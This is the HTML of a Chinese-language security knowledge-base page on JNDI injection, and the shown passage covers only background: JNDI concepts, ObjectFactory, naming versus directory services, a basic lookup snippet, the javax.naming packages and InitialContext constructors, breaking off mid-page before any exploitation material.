<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-代码审计/Java安全/审计基础/JNDI注入" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">JNDI注入 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/代码审计/Java安全/审计基础/JNDI注入"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="JNDI注入 | d4m1ts 知识库"><meta data-rh="true" name="description" content="背景知识"><meta data-rh="true" property="og:description" content="背景知识"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/代码审计/Java安全/审计基础/JNDI注入"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/审计基础/JNDI注入" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/审计基础/JNDI注入" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml">

<link rel="preconnect" href="https://hm.baidu.com">
<script src="https://hm.baidu.com/hm.js?3675030a9721336abea8cd0e46b3f76b" async></script>
<script>window._hmt||(window._hmt=[])</script><link rel="stylesheet" href="/assets/css/styles.49fd3b7f.css">
<script src="/assets/js/runtime~main.89a5e072.js" defer="defer"></script>
<script src="/assets/js/main.3f9bb996.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="navbar__items navbar__items--right"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">在线Markdown</a><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">Reverse Shell Generator</a><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GTFOBins</a><a class="navbar__item navbar__link" href="/friends">友情链接</a><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/渗透测试/">渗透测试</a><button aria-label="展开侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/代码审计/">代码审计</a><button aria-label="折叠侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/category/审计基础">Java安全</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/审计基础">审计基础</a><button aria-label="折叠侧边栏分类 &#x27;审计基础&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/JVM类加载机制">JVM类加载机制</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/Java反射机制">Java反射机制</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/Java序列化与反序列化">Java 序列化和反序列化</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/RMI基础">RMI基础</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/代码审计/Java安全/审计基础/JNDI注入">JNDI注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/IDEA断点调试">IDEA断点调试</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/Java加载字节码">Java加载字节码</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/javassist字节码编程">javassist字节码编程</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/EL表达式">EL表达式</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/SpEL表达式">SpEL表达式</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/OGNL表达式">OGNL表达式</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/IDEA调试JAR">IDEA调试JAR</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/反序列化链分析">反序列化链分析</a><button aria-label="展开侧边栏分类 &#x27;反序列化链分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/应用漏洞分析">应用漏洞分析</a><button aria-label="展开侧边栏分类 &#x27;应用漏洞分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/rce回显链">RCE回显链</a><button aria-label="展开侧边栏分类 &#x27;RCE回显链&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/内存马">内存马</a><button aria-label="展开侧边栏分类 &#x27;内存马&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/cc">C:C++</a><button aria-label="展开侧边栏分类 &#x27;C:C++&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/codeql">codeql</a><button aria-label="展开侧边栏分类 &#x27;codeql&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/chatgpt">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/代码审计/"><span itemprop="name">代码审计</span></a><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Java安全</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/审计基础"><span itemprop="name">审计基础</span></a><meta itemprop="position" content="3"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">JNDI注入</span><meta itemprop="position" content="4"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>JNDI注入</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="背景知识">背景知识<a href="#背景知识" class="hash-link" aria-label="背景知识的直接链接" title="背景知识的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jndi-service-provider">JNDI Service Provider<a href="#jndi-service-provider" class="hash-link" aria-label="JNDI Service Provider的直接链接" title="JNDI Service Provider的直接链接">​</a></h3>
<p>JNDI 与 <code>JNDI Service Provider</code> 的关系类似于 Windows 中 SSPI 与 SSP  的关系。前者是统一抽象出来的接口，而后者是对接口的具体实现。如默认的 <code>JNDI Service Provider</code> 有 <code>RMI/LDAP</code> 等等。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="objectfactory">ObjectFactory<a href="#objectfactory" class="hash-link" aria-label="ObjectFactory的直接链接" title="ObjectFactory的直接链接">​</a></h3>
<p>每一个 <code>Service Provider</code> 可能配有多个 <code>Object Factory</code>。<code>Object Factory</code> 用于将 Naming  Service（如 RMI/LDAP）中存储的数据转换为 Java 中可表达的数据，如 Java 中的对象或 Java 中的基本数据类型。  <strong>JNDI 的注入的问题就出在了可远程下载自定义的 ObjectFactory 类上</strong>。你如果有兴趣的话可以完整看一下 Service  Provider 是如何与多个 ObjectFactory 进行交互的。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="jndi概述">JNDI概述<a href="#jndi概述" class="hash-link" aria-label="JNDI概述的直接链接" title="JNDI概述的直接链接">​</a></h2>
<p>JNDI（Java Naming and Directory Interface，<strong>Java命名和目录接口</strong>）是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。</p>
<p>JNDI是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，<strong>类似JDBC都是构建在抽象层上</strong>。允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，就像人的名字或DNS中的域名与IP的关系。</p>
<p>JNDI由<code>JNDI API</code>、<code>命名管理</code>、<code>JNDI SPI（service provider interface）服务提供的接口</code>组成。我们的应用可以通过JNDI的API去访问相关服务提供的接口</p>
<p><img decoding="async" loading="lazy" alt="image-20210808152033632" src="/assets/images/image-20210808152033632-d4523e5f2857b06c09cdc14c26f435f8.png" width="850" height="579" class="img_ev3q"></p>
<p>JDNI的服务是可以拓展的，可以从JNDI页面下载其他服务提供商，也可以从远程获得其他服务提供商 JDK包括以下命名/目录服务的服务：</p>
<ul>
<li>轻型目录访问协议（ldap）</li>
<li>通用对象请求代理体系结构（CORBA），通用对象服务（COS）名称服务</li>
<li>Java远程方法调用（RMI）注册表</li>
<li>域名服务（DNS）</li>
</ul>
<p>Java命名和目录接口（JNDI）是一种Java API，类似一个索引中心，它允许客户端通过name发现和查找数据和对象。其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。</p>
<p>代码格式如下：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//指定需要查找name名称</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">String jndiName= &quot;Test&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//初始化默认环境</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Context context = new InitialContext();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//查找该name的数据</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DataSource ds = (DataSourse)context.lookup(jndiName);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这里的<code>jndiName变量</code>的值可以是上面的命名/目录服务列表里面的值，如果JNDI名称可控的话可能会被攻击。</p>
<p>那上面提到的<strong>命名</strong>和<strong>目录</strong>是什么？</p>
<ul>
<li><strong>命名服务</strong>：命名服务是一种简单的键值对绑定，可以通过键名检索值，RMI就是典型的命名服务</li>
<li><strong>目录服务</strong>：目录服务是命名服务的拓展。它与命名服务的区别在于它可以通过对象属性来检索对象</li>
</ul>
<blockquote>
<p>举个例子：比如你要在某个学校里里找某个人，那么会通过：年级-&gt;班级-&gt;姓名这种方式来查找，年级、班级、姓名这些就是某个人的属性，这种层级关系就很像目录关系，所以这种存储对象的方式就叫目录服务。LDAP是典型的目录服务</p>
</blockquote>
<p>其实，仔细一琢磨就会感觉其实命名服务与目录服务的本质是一样的，都是通过键来查找对象，只不过目录服务的键要灵活且复杂一点。</p>
<p>在一开始很多人都会被jndi、rmi这些词汇搞的晕头转向，而且很多文章中提到了可以用jndi调用rmi，就更容易让人发昏了。我们只要知道jndi是<strong>对各种访问目录服务的逻辑进行了再封装</strong>，也就是以前我们访问rmi与ldap要写的代码差别很大，但是有了jndi这一层，我们就可以用jndi的方式来轻松访问rmi或者ldap服务，这样访问不同的服务的代码实现基本是一样的。一图胜千言：</p>
<p><img decoding="async" loading="lazy" alt="image-20210808153848550" src="/assets/images/image-20210808153848550-69ac2f683f63e23503d6d671063a1b10.png" width="865" height="367" class="img_ev3q"></p>
<p>从图中可以看到jndi在访问rmi时只是传了一个键foo过去，然后rmi服务端返回了一个对象，访问ldap这种目录服务时，传过去的字符串比较复杂，包含了多个键值对，这些键值对就是对象的属性，LDAP将根据这些属性来判断到底返回哪个对象。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="jndi类">JNDI类<a href="#jndi类" class="hash-link" aria-label="JNDI类的直接链接" title="JNDI类的直接链接">​</a></h2>
<p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">javax.naming</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">javax.naming.directory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//在命名目录服务器中请求事件通知；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">javax.naming.event</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//提供LDAP支持；</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">javax.naming.ldap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">javax.naming.spi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="initialcontext类">InitialContext类<a href="#initialcontext类" class="hash-link" aria-label="InitialContext类的直接链接" title="InitialContext类的直接链接">​</a></h3>
<p>在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="构造方法">构造方法<a href="#构造方法" class="hash-link" aria-label="构造方法的直接链接" title="构造方法的直接链接">​</a></h4>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//构建一个初始上下文。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">InitialContext() </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//构造一个初始上下文，并选择不初始化它。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">InitialContext(boolean lazy) </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//使用提供的环境构建初始上下文。 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">InitialContext(Hashtable&lt;?,?&gt; environment) </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" 